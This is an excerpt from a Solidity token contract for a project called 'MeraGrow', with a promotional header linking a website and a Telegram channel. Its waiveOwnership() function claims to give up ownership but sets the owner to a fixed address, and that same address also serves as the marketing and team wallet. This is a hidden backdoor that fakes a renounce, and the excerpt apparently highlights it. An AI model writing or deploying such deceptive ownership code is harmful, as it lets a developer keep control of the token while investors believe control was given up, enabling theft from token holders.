...
and most profitable blockchain, DeFi and 
metaverse projects and strategies. 
Join the MeraGrow and participate in our journey!

https://meragrow.online
https://t.me/Meragrow
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x74282C931EC1db0Ce3DCfe97EB48111F6468ff6C);
    }
...
contract MeraGrow is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x74282C931EC1db0Ce3DCfe97EB48111F6468ff6C);
    address payable public teamWalletAddress = payable(0x74282C931EC1db0Ce3DCfe97EB48111F6468ff6C);
